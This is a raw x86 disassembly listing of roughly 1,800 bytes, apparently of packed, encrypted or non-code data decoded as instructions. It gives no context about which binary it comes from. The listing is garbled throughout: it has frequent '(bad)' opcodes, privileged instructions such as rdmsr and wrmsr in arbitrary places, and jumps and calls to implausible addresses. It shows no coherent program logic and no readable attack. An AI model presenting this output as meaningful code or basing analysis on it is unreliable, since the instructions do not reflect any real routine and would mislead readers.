  423e96:	rdmsr  
  423e98:	mov    BYTE PTR [edi+0x1a2b6dad],dh
  423e9e:	or     ebp,DWORD PTR [eax]
  423ea0:	sahf   
  423ea1:	rdtsc  
  423ea3:	mov    ah,0x17
  423ea5:	sub    ah,BYTE PTR [ebx-0x6b]
  423ea8:	push   0x80a46b61
  423ead:	retf   
  423eae:	test   eax,0xb052e43d
  423eb3:	xchg   ebp,eax
  423eb4:	lds    edi,FWORD PTR cs:[edx-0x63a6ee8f]
  423ebb:	push   ecx
  423ebc:	push   0x2fa170ab
  423ec1:	jmp    0x423eb9
  423ec3:	xor    al,0xa9
  423ec5:	test   DWORD PTR [esi+0x61],0xdafdd8a1
  423ecc:	test   BYTE PTR [edi],ah
  423ece:	mov    es,WORD PTR [edx-0x4a]
  423ed1:	shl    dl,cl
  423ed3:	in     eax,dx
  423ed4:	mov    esi,0x8a50b3
  423ed9:	fwait
  423eda:	sub    eax,0xa04ab319
  423edf:	push   ss
  423ee0:	dec    ebp
  423ee1:	adc    al,0xdc
  423ee3:	push   0xd25cb89e
  423ee8:	jnp    0x423f57
  423eea:	imul   edx,DWORD PTR [eax],0xffffffdb
  423eed:	fs ds shl bl,0xef
  423ef2:	sub    esi,DWORD PTR [eax-0x25d6a493]
  423ef8:	fistp  QWORD PTR [ecx-0x730750e6]
  423efe:	xor    eax,0xd6c0b003
  423f03:	cs jp  0x423ef3
  423f06:	ficomp DWORD PTR [ebx+ecx*1+0x73]
  423f0a:	cmp    ebx,edi
  423f0c:	int    0xd4
  423f0e:	(bad)  
  423f0f:	mov    dh,0x64
  423f11:	and    DWORD PTR [ecx+0x6d],ebx
  423f14:	enter  0xf024,0x7a
  423f18:	mov    BYTE PTR [ebp+0x7be98d85],0x61
  423f1f:	popf   
  423f20:	clc    
  423f21:	sbb    al,0x92
  423f23:	dec    edx
  423f24:	adc    eax,0xad8dd2db
  423f29:	imul   DWORD PTR [ebp+eax*2-0x3a]
  423f2d:	scas   eax,DWORD PTR es:[edi]
  423f2e:	mov    edi,0xb6aa1db6
  423f33:	push   esi
  423f34:	mov    ah,0xcb
  423f36:	add    BYTE PTR [esi],al
  423f38:	and    DWORD PTR ds:0x6bc2bdc2,ecx
  423f3e:	jbe    0x423fab
  423f40:	pop    ss
  423f41:	ss out 0x80,eax
  423f44:	ins    DWORD PTR es:[edi],dx
  423f45:	rol    DWORD PTR [edi-0x53839d47],1
  423f4b:	mov    dh,0x69
  423f4d:	(bad)  [esi]
  423f4f:	fiadd  DWORD PTR ds:0x26d5724a
  423f55:	imul   esi,DWORD PTR [esi+edi*2-0x6b],0xd
  423f5a:	mov    dh,0xb6
  423f5c:	jbe    0x423f96
  423f5e:	push   edx
  423f5f:	clc    
  423f60:	inc    edi
  423f61:	mov    ah,0x13
  423f63:	and    al,BYTE PTR [eax-0x7a724923]
  423f69:	(bad)  
  423f6a:	xchg   ecx,eax
  423f6b:	xchg   ecx,eax
  423f6c:	test   al,0xdc
  423f6e:	outs   dx,BYTE PTR ds:[esi]
  423f6f:	daa    
  423f70:	jge    0x423eff
  423f72:	sbb    eax,0xadd475b1
  423f77:	enter  0x4ea7,0x8c
  423f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f7c:	lds    ecx,FWORD PTR [edx+0x7a]
  423f7f:	(bad)  [esi+0x777eb1b1]
  423f85:	add    BYTE PTR [edx],dh
  423f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f88:	es inc esp
  423f8a:	and    ecx,DWORD PTR [eax+ebp*1+0x4b1b6e2a]
  423f91:	and    esp,edi
  423f93:	dec    eax
  423f94:	adc    eax,0x696aa2b9
  423f99:	fcmovnu st,st(0)
  423f9b:	call   0x36cf9706
  423fa0:	adc    eax,0x35576b44
  423fa5:	fisttp DWORD PTR [ebp+0x4282636d]
  423fab:	outs   dx,BYTE PTR ds:[esi]
  423fac:	es and eax,0x44f56690
  423fb2:	ja     0x424021
  423fb4:	mov    ebx,0x10f944d1
  423fb9:	fcom   DWORD PTR [ebx+edx*8]
  423fbc:	and    BYTE PTR [ecx],al
  423fbe:	in     al,dx
  423fbf:	mov    dh,0xd4
  423fc1:	outs   dx,BYTE PTR ds:[esi]
  423fc2:	pop    ebx
  423fc3:	adc    bh,cl
  423fc5:	push   eax
  423fc6:	jo     0x423fed
  423fc8:	out    0x5f,al
  423fca:	js     0x423f76
  423fcc:	sbb    bl,0xd6
  423fcf:	ret    0xc72f
  423fd2:	push   ds
  423fd3:	mov    dl,0x1d
  423fd5:	inc    esp
  423fd6:	lds    esp,FWORD PTR [eax-0x15]
  423fd9:	stos   BYTE PTR es:[edi],al
  423fda:	in     eax,dx
  423fdb:	or     BYTE PTR [ebp+0x296bdc66],bh
  423fe1:	inc    ebx
  423fe2:	lds    ebp,FWORD PTR [esi+0x6c]
  423fe5:	dec    ebx
  423fe6:	ins    DWORD PTR es:[edi],dx
  423fe7:	mov    BYTE PTR [ebx-0x2f],ch
  423fea:	mov    esi,0x638a72ef
  423fef:	sbb    eax,eax
  423ff1:	rol    dh,cl
  423ff3:	(bad)  
  423ff4:	push   cs
  423ff5:	and    edx,DWORD PTR [ecx-0x34]
  423ff8:	ret    0xac38
  423ffb:	test   DWORD PTR [ebp+0x5363c971],ebp
  424001:	(bad)  
  424002:	or     bl,BYTE PTR [ecx-0x45627302]
  424008:	mov    ch,0x9b
  42400a:	or     DWORD PTR [ecx],0xe1c650f0
  424010:	or     esp,DWORD PTR [eax]
  424012:	imul   edx,DWORD PTR [ecx+0x55bb6db6],0xdf8ebb1a
  42401c:	push   cs
  42401d:	xor    al,0xbc
  42401f:	rol    DWORD PTR [ebx+ecx*8-0x4c],0xc1
  424024:	push   edx
  424025:	fcmovnbe st,st(7)
  424027:	jmp    0x3915b0f
  42402c:	stc    
  42402d:	(bad)  [esi-0x1e674b4f]
  424033:	gs xchg ebp,eax
  424035:	sbb    edx,DWORD PTR [edi]
  424037:	bound  esp,QWORD PTR [ebx-0x11]
  42403a:	sub    bl,ch
  42403c:	or     al,0x1b
  42403e:	pop    ebx
  42403f:	(bad)  
  424040:	into   
  424041:	inc    edx
  424042:	jns    0x423fcf
  424044:	gs ret 
  424046:	mov    al,ds:0xadad8db6
  42404b:	mov    DWORD PTR [ecx-0x62],ebx
  42404e:	or     eax,0x7d94000b
  424053:	cmp    eax,0x96175a16
  424058:	enter  0xbb8a,0xd7
  42405c:	aam    0x97
  42405e:	jae    0x42401a
  424060:	mov    eax,ds:0x6db76c2d
  424065:	cmp    ebx,DWORD PTR [esp+eax*2]
  424068:	and    dl,BYTE PTR [eax]
  42406a:	fucomi st,st(4)
  42406c:	(bad)  
  42406d:	inc    edx
  42406e:	mov    ebx,0x5da67cb1
  424073:	add    BYTE PTR [edx-0x51],dl
  424076:	sub    eax,0x2bb3bd9c
  42407b:	mov    dh,0xb0
  42407d:	mov    ch,0xdb
  42407f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424080:	(bad)  
  424081:	frstor [ecx+0x6a78ef9e]
  424087:	and    DWORD PTR [ebp+ebx*8-0xa17876a],ecx
  42408e:	das    
  42408f:	ja     0x424032
  424091:	mov    ds:0xb64e385d,eax
  424096:	data16 test al,0x74
  424099:	test   eax,0x8fb0bfd7
  42409e:	sbb    bl,BYTE PTR [eax+0x5b02c123]
  4240a4:	jecxz  0x42408f
  4240a6:	dec    ecx
  4240a8:	add    DWORD PTR [edx+eiz*4],0xffffffc9
  4240ac:	mov    dh,0xdb
  4240ae:	mov    dh,0xb1
  4240b0:	lods   eax,DWORD PTR ds:[esi]
  4240b1:	pop    eax
  4240b2:	in     al,0xe5
  4240b4:	loopne 0x4240d4
  4240b6:	bound  edx,QWORD PTR es:[ecx-0x6b]
  4240ba:	and    ebp,DWORD PTR [ebp-0x41]
  4240bd:	outs   dx,BYTE PTR ds:[esi]
  4240be:	adc    al,0x52
  4240c0:	cmp    DWORD PTR [edi-0x66cfb348],esi
  4240c6:	(bad)  
  4240c7:	imul   edx,DWORD PTR [ebp-0x23abb24a],0xf014da4a
  4240d1:	and    ebp,DWORD PTR [ebp-0x4f]
  4240d4:	sub    eax,0xa1e6ee6d
  4240d9:	jle    0x424122
  4240db:	popa   
  4240dc:	daa    
  4240dd:	push   esp
  4240de:	ret    0xbb42
  4240e1:	mov    ah,0x2
  4240e3:	out    0xce,eax
  4240e5:	fld    DWORD PTR [esi]
  4240e7:	repnz pop es
  4240e9:	loopne 0x424073
  4240eb:	sbb    ebx,DWORD PTR [ebx]
  4240ed:	ins    DWORD PTR es:[edi],dx
  4240ee:	jmp    0x424139
  4240f0:	in     eax,0x43
  4240f2:	xor    cl,BYTE PTR [edx+0x57]
  4240f5:	mov    eax,0x2b62255d
  4240fa:	fild   QWORD PTR [esi-0x1d]
  4240fd:	adc    edx,DWORD PTR [edx]
  4240ff:	adc    al,0x35
  424101:	add    BYTE PTR [esi+0x42],cl
  424104:	fwait
  424105:	int3   
  424106:	mov    edx,0x3db6b76
  42410b:	fimul  WORD PTR [esi]
  42410d:	mov    edi,0x7a79516a
  424112:	(bad)  
  424114:	pop    ebx
  424115:	mov    ds:0xfef1a1b0,al
  42411a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42411b:	xor    al,0x8b
  42411d:	enter  0xc62f,0xb6
  424121:	jno    0x42418e
  424123:	repnz push ss
  424125:	jno    0x424122
  424127:	push   edi
  424128:	xchg   edx,eax
  424129:	push   cs
  42412a:	add    ebp,ebp
  42412c:	jbe    0x424199
  42412e:	fisttp DWORD PTR [ebp-0xa6438bb]
  424134:	cmc    
  424135:	out    0x4d,al
  424137:	xchg   esi,eax
  424138:	cwde   
  424139:	fnsave [esi-0x435d2e4f]
  42413f:	aas    
  424140:	rcr    BYTE PTR fs:[ebx+0x1ba582b0],cl
  424147:	in     eax,0x50
  424149:	sub    dh,BYTE PTR [edx+0x48]
  42414c:	or     DWORD PTR [ebp-0x5d],esp
  42414f:	pop    ebp
  424150:	ficomp DWORD PTR [eax+0x6a]
  424153:	mov    esp,0x3d6e302
  424158:	test   DWORD PTR [eax+0x5ed83b95],esi
  42415e:	shr    BYTE PTR [ebp+0x60b541ef],0x6c
  424165:	xchg   edx,eax
  424166:	lods   eax,DWORD PTR ds:[esi]
  424167:	lods   eax,DWORD PTR ds:[esi]
  424168:	sub    eax,0xa64bd85d
  42416d:	sub    edx,DWORD PTR [eax]
  42416f:	dec    esp
  424170:	sbb    DWORD PTR [edx+0x6b684ad1],0x17
  424177:	fiadd  DWORD PTR [edi+0x16]
  42417a:	pop    esp
  42417b:	std    
  42417c:	pusha  
  42417d:	stos   BYTE PTR es:[edi],al
  42417e:	enter  0x56d7,0xe9
  424182:	mov    eax,ds:0xfa040d5b
  424187:	add    edi,edx
  424189:	(bad)  
  42418a:	jge    0x42413f
  42418c:	sub    BYTE PTR [esi-0x73],0x60
  424190:	or     DWORD PTR [ebp+eax*1-0x1c],0x616b6bcb
  424198:	jmp    0x424182
  42419a:	sub    ebx,edi
  42419c:	int3   
  42419d:	jae    0x42416d
  42419f:	push   0x85ad1c68
  4241a4:	test   DWORD PTR [ebp+0x1e],ebp
  4241a7:	inc    esp
  4241a8:	xor    BYTE PTR [eax-0x15],dh
  4241ab:	lods   al,BYTE PTR ds:[esi]
  4241ac:	or     esp,eax
  4241ae:	fild   DWORD PTR [edx-0x1d]
  4241b1:	repnz aas 
  4241b3:	fiadd  WORD PTR [eax]
  4241b5:	dec    eax
  4241b6:	lds    edx,FWORD PTR [eax]
  4241b8:	out    0xd0,eax
  4241ba:	ds mov al,0xd2
  4241bd:	push   0xdf0b6e00
  4241c2:	pop    edi
  4241c3:	repnz sub bh,cl
  4241c6:	inc    DWORD PTR [edx+ebx*8]
  4241c9:	jbe    0x42416c
  4241cb:	fisttp QWORD PTR [esi-0x63]
  4241ce:	sub    BYTE PTR [edi+0x1c],bl
  4241d1:	je     0x4241c7
  4241d3:	retf   
  4241d4:	adc    DWORD PTR [ebp-0x28],ecx
  4241d7:	mov    dh,0xb6
  4241d9:	frstor [eax]
  4241db:	xchg   esp,eax
  4241dc:	push   edx
  4241dd:	jge    0x42425b
  4241df:	ret    0x37a
  4241e2:	xchg   ebp,eax
  4241e3:	(bad)  
  4241e4:	mov    dh,0xd5
  4241e6:	adc    DWORD PTR [edi+0x2342d57],esi
  4241ec:	pshufw mm2,mm4,0xce
  4241f0:	ins    DWORD PTR es:[edi],dx
  4241f1:	sub    al,0xb4
  4241f3:	in     eax,dx
  4241f4:	dec    eax
  4241f5:	xor    eax,0xa0681e0b
  4241fa:	out    0xa2,al
  4241fc:	pop    ds
  4241fd:	mov    dh,0xb0
  4241ff:	sub    eax,0x79f58f2c
  424204:	addr16 xchg edx,eax
  424206:	add    esp,0xbb5b4d1d
  42420c:	ins    DWORD PTR es:[edi],dx
  42420d:	fisttp DWORD PTR [ecx+0x3b]
  424210:	loop   0x4241a1
  424212:	(bad)  
  424213:	into   
  424214:	add    DWORD PTR [eax],esp
  424216:	mov    ecx,0xd851e76e
  42421b:	cs ins DWORD PTR es:[edi],dx
  42421d:	out    dx,eax
  42421e:	adc    eax,0xb3efd81a
  424223:	pop    ebx
  424224:	add    DWORD PTR [esi-0x25],esi
  424227:	ds mov edx,0xafb8b369
  42422d:	mov    ecx,0xbfaa5865
  424232:	test   BYTE PTR [esi-0x49595a78],dh
  424238:	cwde   
  424239:	imul   ebx,DWORD PTR [ebp-0x33],0xffffffa4
  42423d:	cwde   
  42423e:	test   DWORD PTR [ebp-0x79071723],ebp
  424244:	neg    BYTE PTR [edx+0x34d1e0b1]
  42424a:	push   ss
  42424b:	lea    ebp,[ebp-0x5b4e4923]
  424251:	and    eax,0x79
  424254:	cld    
  424255:	sub    DWORD PTR [ecx],0x20
  424258:	(bad)  
  424259:	sbb    ebx,DWORD PTR [ebx]
  42425b:	or     eax,0x74188cc1
  424260:	jecxz  0x424292
  424262:	mov    esp,0xb6ed3127
  424267:	sub    eax,0xb6aadfb5
  42426c:	add    bh,BYTE PTR [ebp+0x4c]
  42426f:	out    0x80,al
  424271:	mov    edi,0xbb6275f
  424276:	or     ecx,DWORD PTR [ebx+0x5cc0c1bb]
  42427c:	mov    WORD PTR [ebx+0x36d5bc1],?
  424282:	mov    dh,0xda
  424284:	and    eax,DWORD PTR [esi+0x15]
  424287:	fs loopne 0x4242be
  42428a:	outs   dx,BYTE PTR ds:[esi]
  42428b:	mov    cl,0x6d
  42428d:	sub    al,0xb5
  42428f:	jno    0x424214
  424291:	mov    dh,0x59
  424293:	mov    edx,0x6bef3235
  424298:	mov    ebx,0xac78b0b5
  42429d:	or     bl,BYTE PTR [esi-0x5e7cc42a]
  4242a3:	mov    esi,0x26ae952b
  4242a8:	push   0x1fbdb1d8
  4242ad:	xchg   ecx,eax
  4242ae:	lea    ebx,[ebx]
  4242b0:	(bad)  [esi-0x1ba95f17]
  4242b6:	cwde   
  4242b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242b8:	dec    esi
  4242b9:	cmp    al,BYTE PTR [eax-0x46]
  4242bc:	push   ss
  4242bd:	mov    al,0xd0
  4242bf:	outs   dx,BYTE PTR ds:[esi]
  4242c0:	das    
  4242c1:	shl    BYTE PTR [esi+ecx*1],0xd9
  4242c5:	aaa    
  4242c6:	nop
  4242c7:	lea    esi,[esi+0x6b]
  4242ca:	mov    bh,0xc2
  4242cc:	stos   BYTE PTR es:[edi],al
  4242cd:	(bad)  
  4242ce:	xchg   ebp,eax
  4242cf:	cmp    BYTE PTR [ebx],bl
  4242d1:	inc    esi
  4242d2:	mov    eax,ds:0xd866edf6
  4242d7:	mov    dh,0x4
  4242d9:	(bad)  
  4242da:	scas   al,BYTE PTR es:[edi]
  4242db:	mov    al,ds:0x9fbdd7a9
  4242e1:	clc    
  4242e2:	add    edx,0x9a206ed6
  4242e8:	loopne 0x4242b5
  4242ea:	gs sub eax,0x616d0ea6
  4242f0:	adc    DWORD PTR [edx-0x23],0x14
  4242f4:	push   ebx
  4242f5:	and    ch,BYTE PTR [eax-0x50]
  4242f8:	dec    ebx
  4242f9:	(bad)  [ebp-0x345a4673]
  4242ff:	fucomp st(6)
  424301:	in     al,dx
  424302:	mov    ecx,0x687b8695
  424307:	popa   
  424308:	stos   DWORD PTR es:[edi],eax
  424309:	ins    DWORD PTR es:[edi],dx
  42430a:	sti    
  42430b:	or     bl,ah
  42430d:	in     eax,0xf2
  42430f:	rol    dl,1
  424311:	push   eax
  424312:	fistp  DWORD PTR [esi+0x4fc7b2e8]
  424318:	sti    
  424319:	push   esi
  42431a:	jmp    0x424333
  42431c:	mov    ah,0xe5
  42431e:	mov    dl,0xd1
  424320:	daa    
  424321:	stos   BYTE PTR es:[edi],al
  424322:	wrmsr  
  424324:	sahf   
  424325:	imul   edi,DWORD PTR [ecx+esi*2+0x4b1bb46c],0x92bde88e
  424330:	jb     0x4242eb
  424332:	arpl   WORD PTR [ecx],sp
  424334:	fdiv   DWORD PTR [esi-0x4aefd2d2]
  42433a:	shl    DWORD PTR [ebx+0x77055ee8],1
  424340:	or     esi,DWORD PTR [esi+0x6cb42db4]
  424346:	adc    edx,DWORD PTR [ebp+0x5c29c24a]
  42434c:	sbb    eax,0xedaad4b2
  424351:	push   ebx
  424352:	ror    DWORD PTR [ebx],cl
  424354:	std    
  424355:	mov    ds:0xa2db07c2,eax
  42435a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435b:	lea    edx,[eax+0x2927ec05]
  424361:	sub    BYTE PTR [ebp+0x53376dbe],0x95
  424368:	or     ebp,DWORD PTR [ebx+ebx*2+0x32]
  42436c:	in     eax,0xa7
  42436e:	push   ds
  42436f:	add    BYTE PTR [eax+eiz*4+0x5826b6da],dh
  424376:	into   
  424377:	mov    edi,0x655c6ec9
  42437c:	sbb    ebp,DWORD PTR [ebx+0x37]
  42437f:	push   ss
  424380:	fcomp  DWORD PTR [ecx]
  424382:	sub    al,0xf3
  424384:	xchg   ebx,eax
  424385:	imul   esi,DWORD PTR ds:0xb689717c,0x3c6b602d
  42438f:	or     dh,BYTE PTR [ecx-0x3c7d7031]
  424395:	sub    eax,0x17855b01
  42439a:	adc    BYTE PTR [edi-0x727a3266],0x76
  4243a1:	mov    ds:0xa29b6980,eax
  4243a6:	add    bh,BYTE PTR [edi]
  4243a8:	xchg   dh,ch
  4243aa:	push   0x75c6db1b
  4243af:	fldenv [eax-0x31]
  4243b2:	mov    dh,0x7d
  4243b4:	and    DWORD PTR [eax+eiz*1],esp
  4243b7:	les    esi,FWORD PTR [esi-0x4498a48b]
  4243bd:	pop    edi
  4243be:	or     eax,0x5047050
  4243c3:	retf   0x6a09
  4243c6:	mov    bh,0xb6
  4243c8:	test   DWORD PTR [eax+eax*4],edi
  4243cb:	mov    al,0x48
  4243cd:	sar    BYTE PTR [edx+0x24],cl
  4243d0:	pop    ss
  4243d1:	cmp    ch,BYTE PTR [edx+0x6b]
  4243d4:	cmp    BYTE PTR [ecx-0x31],bh
  4243d7:	push   edi
  4243d8:	and    al,BYTE PTR [ebx+eax*1]
  4243db:	jbe    0x424380
  4243dd:	pop    ebp
  4243de:	push   0xb
  4243e0:	xchg   ecx,eax
  4243e1:	xchg   DWORD PTR [eax+0x6e0f9af5],ebx
  4243e7:	loope  0x4243f6
  4243e9:	jo     0x424394
  4243eb:	jbe    0x42443f
  4243ed:	push   es
  4243ee:	mov    dh,0x54
  4243f0:	outs   dx,DWORD PTR ds:[esi]
  4243f1:	xor    al,0x7c
  4243f3:	int3   
  4243f4:	inc    esp
  4243f5:	or     ecx,DWORD PTR [ebx]
  4243f7:	or     edx,eax
  4243f9:	(bad)  
  4243fa:	popa   
  4243fb:	popa   
  4243fc:	jae    0x4243d8
  4243fe:	mov    dh,0xb1
  424400:	popa   
  424401:	mov    al,ds:0x45abd81e
  424406:	(bad)  
  424407:	lock sahf 
  424409:	(bad)  
  42440a:	ret    0xc2c2
  42440d:	cmp    BYTE PTR [edx],ah
  42440f:	imul   ebp,DWORD PTR [edi+0x7024c4e0],0xc2ed6c2d
  424419:	pop    eax
  42441a:	popa   
  42441b:	sahf   
  42441c:	dec    edi
  42441d:	xchg   edx,eax
  42441e:	inc    esp
  42441f:	push   ebp
  424420:	inc    eax
  424421:	lods   eax,DWORD PTR ds:[esi]
  424422:	lea    eax,[esi-0x50]
  424425:	mov    al,0x56
  424427:	fidivr WORD PTR [edi-0x39]
  42442a:	cmp    cl,BYTE PTR [ebp-0x252727a4]
  424430:	mov    al,0x43
  424432:	adc    DWORD PTR [esi+edx*8],0xffffff9c
  424436:	mov    ch,0x3d
  424438:	(bad)  [ebp+0x6b72a58d]
  42443e:	scas   al,BYTE PTR es:[edi]
  42443f:	repnz ins DWORD PTR es:[edi],dx
  424441:	dec    edi
  424442:	fwait
  424443:	push   ss
  424444:	mov    ebp,0xd6b6171b
  424449:	pop    edx
  42444a:	jmp    0x4244c2
  42444c:	retf   
  42444d:	xor    eax,0xd5158494
  424452:	test   al,0x6a
  424454:	sub    esi,DWORD PTR [edi+0x6d6a181a]
  42445a:	(bad)  
  42445b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42445c:	fsubr  DWORD PTR [edx*4-0x2729f48]
  424463:	inc    ebx
  424464:	add    bh,BYTE PTR ds:0xb4b8c135
  42446a:	mov    cl,0x2d
  42446c:	addr16 jl 0x424422
  42446f:	pop    es
  424470:	mov    bh,0x6c
  424472:	mov    al,0x9c
  424474:	xor    al,0x85
  424476:	mov    dh,0xb4
  424478:	sbb    DWORD PTR [eax],0xfffffffa
  42447b:	icebp  
  42447c:	mov    bl,0x99
  42447e:	mov    al,0x3d
  424480:	mov    al,ds:0x68b6b685
  424485:	inc    esp
  424486:	jno    0x424473
  424488:	cmc    
  424489:	fwait
  42448a:	neg    bl
  42448c:	(bad)  
  42448d:	(bad)  
  42448e:	mov    dh,0x80
  424490:	es add eax,0x2d378d77
  424496:	repnz sub esp,DWORD PTR [ecx+0x63]
  42449a:	arpl   WORD PTR [ebx-0x38],si
  42449d:	sub    al,0xd0
  42449f:	stos   DWORD PTR es:[edi],eax
  4244a0:	inc    esi
  4244a1:	or     al,0xe7
  4244a3:	xor    BYTE PTR [edi-0x569c9c93],0xdb
  4244aa:	les    esp,FWORD PTR [ebp-0x5b48b58c]
  4244b0:	jmp    0x2b1dbb16
  4244b5:	ins    BYTE PTR es:[edi],dx
  4244b6:	pop    esp
  4244b7:	loope  0x4244f3
  4244b9:	aaa    
  4244ba:	loop   0x42452a
  4244bc:	adc    dh,BYTE PTR [edx+eiz*2-0x48948ec2]
  4244c3:	xchg   edx,eax
  4244c4:	fsubr  QWORD PTR [ebp+edi*2-0x41793ecb]
  4244cb:	jb     0x424458
  4244cd:	mov    dh,0xe
  4244cf:	and    BYTE PTR [esi],dl
  4244d1:	shr    DWORD PTR [esi],0x7a
  4244d4:	cmp    esp,ebp
  4244d6:	ins    DWORD PTR es:[edi],dx
  4244d7:	popa   
  4244d8:	stos   DWORD PTR es:[edi],eax
  4244d9:	ins    DWORD PTR es:[edi],dx
  4244da:	pop    ss
  4244db:	dec    edi
  4244dc:	xchg   esp,eax
  4244dd:	ins    BYTE PTR es:[edi],dx
  4244de:	mov    dh,0xb0
  4244e0:	pop    DWORD PTR [eax+0x63]
  4244e3:	test   DWORD PTR [eax+0x6c],ebp
  4244e6:	fld    TBYTE PTR [ebp+0x1]
  4244e9:	dec    ebp
  4244ea:	cli    
  4244eb:	mov    BYTE PTR [edx],dh
  4244ed:	pop    ss
  4244ee:	sub    cl,0x18
  4244f1:	mov    ds:0xbb5db4b5,eax
  4244f6:	test   DWORD PTR [edx-0x17],ebx
  4244f9:	ds sub al,0x9e
  4244fc:	std    
  4244fd:	or     DWORD PTR [ebx+0x6075a361],ebx
  424503:	outs   dx,DWORD PTR ds:[esi]
  424504:	jae    0x424490
  424506:	rol    BYTE PTR [ebx+0x5f],cl
  424509:	mov    ds:0x6da361,eax
  42450e:	jge    0x424509
  424510:	pop    esp
  424511:	sbb    bl,BYTE PTR [ecx-0x25e89275]
  424517:	ins    DWORD PTR es:[edi],dx
  424518:	aam    0x77
  42451a:	call   0x8177409d
  42451f:	and    al,0xb9
  424521:	aas    
  424522:	lea    ebp,[ebp+0x63]
  424525:	mov    eax,ds:0x87cc4302
  42452a:	ficom  DWORD PTR [eiz*1+0x68dada1e]
  424531:	mov    bh,0x8
  424533:	into   
  424534:	mov    esp,0x8bf32ff5
  424539:	add    DWORD PTR [edi-0x2e],esi
  42453c:	ins    DWORD PTR es:[edi],dx
  42453d:	test   eax,0xc44acadd
  424542:	sbb    eax,0xd126f923
  424547:	mov    DWORD PTR [eax-0x4925a7a3],esi
  42454d:	adc    DWORD PTR [edi-0x2763e5f],edx
  424553:	(bad)  
  424554:	iret   
  424555:	call   0x178920c7
  42455a:	cmp    BYTE PTR [edx-0x5e],cl
  42455d:	add    bl,BYTE PTR [edx]
  42455f:	scas   eax,DWORD PTR es:[edi]
  424560:	xchg   edx,eax
  424561:	jno    0x424590
  424563:	shl    DWORD PTR [esi+0x76ba14b5],1
  424569:	push   cs
  42456a:	pop    ss
  42456b:	repnz adc dl,BYTE PTR ds:0xa971adc2
  424572:	cmp    ebp,DWORD PTR [edi]
  424574:	das    
  424575:	adc    eax,DWORD PTR [ebp+0x38]
  424578:	jecxz  0x424525
  42457a:	dec    ecx
  42457b:	mov    cl,0xdd
  42457d:	retf   0xdc2
  424580:	pop    ds
  424581:	cld    
  424582:	jge    0x42450a
  424584:	fsubr  QWORD PTR [edx+0x56db6d78]
  42458a:	pop    ss
  42458b:	std    
  42458c:	cs xchg edi,eax
  42458e:	jo     0x42455b
  424590:	scas   eax,DWORD PTR es:[edi]
  424591:	imul   eax,DWORD PTR ds:0xba0eb701,0x26
  424598:	lea    ebp,[esp+eiz*2]
  42459b:	mov    WORD PTR [eax+0x5a],gs
  42459e:	xchg   ebp,eax
  42459f:	test   DWORD PTR [ebp-0x25],ebp
  4245a2:	add    al,0x27
  4245a4:	or     ebx,DWORD PTR [eax+0x4b5fd992]
  4245aa:	(bad)  
  4245ab:	fsubr  st,st(0)
  4245ad:	mov    BYTE PTR [ebx],cl
  4245af:	fld    DWORD PTR [ecx-0x7f]
  4245b2:	ror    DWORD PTR [ecx],1
  4245b4:	inc    edx
  4245b5:	enter  0x50db,0xdc
  4245b9:	pop    eax
  4245ba:	lods   al,BYTE PTR ds:[esi]
  4245bb:	popa   
  4245bc:	inc    ebp
  4245bd:	sub    ecx,0x66
  4245c0:	xor    BYTE PTR [eax+0x20],dl
  4245c3:	cmp    al,BYTE PTR [eax+0x5cd75b0b]
  4245c9:	popf   
  4245ca:	push   ds
  4245cb:	inc    edi
  4245cc:	pop    ecx
  4245cd:	jmp    0x42457a
  4245cf:	jno    0x42463c
  4245d1:	fdiv   QWORD PTR ds:0xb306d7c3
  4245d7:	xchg   BYTE PTR [edx+0x58dc1f36],cl
  4245dd:	bound  esp,QWORD PTR [ecx-0x57]
  4245e0:	jg     0x424573
  4245e2:	shl    ecx,cl
  4245e4:	mov    dh,BYTE PTR [esi+0x7b]
  4245e7:	dec    ebx
  4245e8:	pop    ebx
  4245e9:	pop    ebx
  4245ea:	push   edi
  4245eb:	inc    di
  4245ed:	jmp    0xef88741e
  4245f2:	xor    BYTE PTR [ecx+0x301b0bb5],0x3b
  4245f9:	test   DWORD PTR [edx],0x9db30e1e
  4245ff:	ins    DWORD PTR es:[edi],dx
  424600:	imul   ebx,DWORD PTR [ebx-0x48],0x5d
  424604:	hlt    
  424605:	inc    ebp
  424606:	inc    ebx
  424607:	out    dx,eax
  424608:	and    dh,ch
  42460a:	sub    BYTE PTR [esi+ecx*8+0x6d6e146e],dh
  424611:	sub    DWORD PTR [eax],0xffffffcd
  424614:	jp     0x4245f1
  424616:	adc    BYTE PTR [eax],dh
  424618:	add    BYTE PTR [ebp-0x2f4a47aa],0xa7
  42461f:	inc    eax
  424620:	sbb    al,0x1
  424622:	out    dx,al
  424623:	jecxz  0x4245d7
  424625:	xchg   edx,eax
  424626:	outs   dx,BYTE PTR ds:[esi]
  424627:	pop    ebx
  424628:	mov    ah,0xdb
  42462a:	inc    ecx
  42462b:	push   cs
  42462c:	xor    ch,BYTE PTR [edi+0x2f]
  42462f:	leave  
  424630:	jmp    0xb2c0:0x4b8e998f
  424637:	aam    0x5f
  424639:	mov    al,0xc2
  42463b:	jnp    0x42462b
  42463d:	xor    BYTE PTR [esi-0x5e92494a],dl
  424643:	add    bh,al
  424645:	in     eax,0xce
  424647:	stos   BYTE PTR es:[edi],al
  424648:	mov    al,BYTE PTR [ecx-0x44]
  42464b:	lea    esi,[esi-0x25]
  42464e:	fdivr  DWORD PTR [ebp-0x48]
  424651:	adc    dl,al
  424653:	gs jecxz 0x4246c4
  424656:	adc    al,0x45
  424658:	sub    eax,0x3ab76c2c
  42465d:	das    
  42465e:	fs aas 
  424660:	mov    eax,ds:0x4003ac19
  424665:	enter  0xa5b7,0x6d
  424669:	sub    ebp,edi
  42466b:	xor    eax,0x6bfd8cc6
  424670:	call   0x1616:0x16a4a00e
  424677:	sbb    bh,BYTE PTR [eax+0x31]
  42467a:	ds test DWORD PTR cs:[ebx],ebp
  42467e:	mov    ah,0x2d
  424680:	push   ss
  424681:	push   ss
  424682:	fmul   DWORD PTR [edi+ebp*8-0x4c1407d0]
  424689:	mov    cl,0x6d
  42468b:	fdiv   QWORD PTR [esi+0xe5d548d]
  424691:	xchg   ebp,eax
  424692:	lds    edi,FWORD PTR [edx+0x2a]
  424695:	mov    bl,0x0
  424697:	mov    BYTE PTR [edx+ebx*2-0x42884bb9],dl
  42469e:	aas    
